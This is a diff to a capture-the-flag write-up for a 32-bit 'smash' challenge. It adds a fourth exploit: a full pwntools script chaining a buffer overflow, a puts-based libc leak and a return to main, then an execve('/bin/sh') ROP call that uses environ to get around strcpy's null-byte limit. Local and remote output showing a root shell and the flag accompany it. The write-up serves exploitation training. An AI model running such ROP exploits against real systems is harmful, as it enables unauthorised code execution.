@@ -19,6 +19,8 @@ Exploit 2: GOT(`free` -> `main`) -> leak libc (GOT) -> GOT(`printf` -> `system`)
 
 Exploit 3: BOF -> ROP -> leak libc (GOT) -> _ret2main_ -> BOF -> ROP -> `system` -> shell
 
+Exploit 4: BOF -> ROP -> leak libc (GOT) -> _ret2main_ -> BOF -> ROP -> `execve` -> shell
+
 
 ## Analysis
 
@@ -363,7 +365,7 @@ This will leak the address of `puts` for computing the base of libc.
 
 After the _ret2main_, do the same BOF, but this time return to `system` and get a shell.
 
-> This did not work on my Ubuntu 18 dev container because `system` ends in `\x00` and `strcpy` stops and the first null, fortuneatly the challenge server does not have this version of libc.
+> This did not work on my Ubuntu 18 dev container because `system` ends in `\x00` and `strcpy` stops and the first null, fortunately, the challenge server does not have this version of libc.
 
 Output:
 
@@ -384,6 +386,102 @@ Output:
     PIE:      PIE enabled
 [*] puts: 0xf7dad150
 [*] baselibc: 0xf7d4e000
+[*] Switching to interactive mode
+
+$ cat flag.txt
+csictf{5up32_m4210_5m45h_8202}
+```
+
+
+### Exploit 4: _nulls?_ null problem
+
+```
+#!/usr/bin/python3
+
+from pwn import *
+
+binary = ELF('./hello')
+context.update(arch='i386',os='linux')
+
+p = process(binary.path)
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+#p = remote('chall.csivit.com', 30046)
+#libc = ELF('libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so')
+
+payload  = 0x88 * b'A'
+payload += p32(binary.plt.puts)
+payload += p32(binary.sym.main)
+payload += p32(binary.got.puts)
+
+p.sendlineafter('name?\n', payload)
+p.recvuntil('!\n')
+_ = p.recv(4)
+puts = u32(_ + (4-len(_))*b'\x00')
+log.info('puts: ' + hex(puts))
+baselibc = puts - libc.sym.puts
+log.info('baselibc: ' + hex(baselibc))
+libc.address = baselibc
+
+payload  = 0x88 * b'A'
+payload += p32(libc.sym.execve)
+payload += 4 * b'B'
+payload += p32(libc.search(b'/bin/sh').__next__())
+payload += p32(libc.sym.environ)
+payload += p32(libc.sym.environ)
+
+p.sendlineafter('name?\n', payload)
+p.recvuntil('!')
+p.interactive()
+```
+
+In cases, like the above, where `system` has a null in Ubuntu 18's libc preventing `strcpy` from copying the entire exploit, consider `execve` as an alternate.
+
+`execve` requires three parameters: the command, a _word_ array (e.g. `char* argv[]`) of command line parameters, and a second _word_ array (e.g. `char* envp[]`) of environmental variables.  Normally you'd just pass null (`0x0`), however, since `strcpy` terminates the copy at the first null, it's not possible to push this on the stack.  Fortunately, libc provides a `char* envp[]` that can be used for both parameters, `environ`.
+
+Local output (Ubuntu 18 Docker container):
+
+```
+# ./exploit4.py
+[*] '/pwd/datajerk/csictf2020/smash/hello'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process '/pwd/datajerk/csictf2020/smash/hello': pid 15037
+[*] '/lib/i386-linux-gnu/libc.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] puts: 0xf7e12b40
+[*] baselibc: 0xf7dab000
+[*] Switching to interactive mode
+
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Remote output (task server):
+
+```
+# ./exploit3a.py
+[*] '/pwd/datajerk/csictf2020/smash/hello'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Opening connection to chall.csivit.com on port 30046: Done
+[*] '/pwd/datajerk/csictf2020/smash/libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] puts: 0xf7d8a150
+[*] baselibc: 0xf7d2b000
 [*] Switching to interactive mode
 
 $ cat flag.txt
